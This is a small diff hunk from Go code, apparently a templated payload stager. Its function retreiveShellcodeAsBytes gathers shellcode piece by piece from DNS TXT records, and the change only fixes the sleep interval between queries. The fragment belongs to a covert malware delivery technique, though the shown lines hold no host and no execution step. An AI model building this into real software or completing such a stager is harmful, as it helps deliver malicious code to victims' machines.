@@ -77,7 +77,7 @@ func retreiveShellcodeAsBytes() []byte {
 		
 		txtRecord := strings.Split(dnsResponse.Answer[0].String(), "\t")[4]
 		txtRecords = txtRecords + strings.Replace(txtRecord, "\"", "", -1)
-		time.Sleep({SLEEP} * 1000)
+		time.Sleep({SLEEP} * 1000 * time.Millisecond)
 		i++
 	}
 
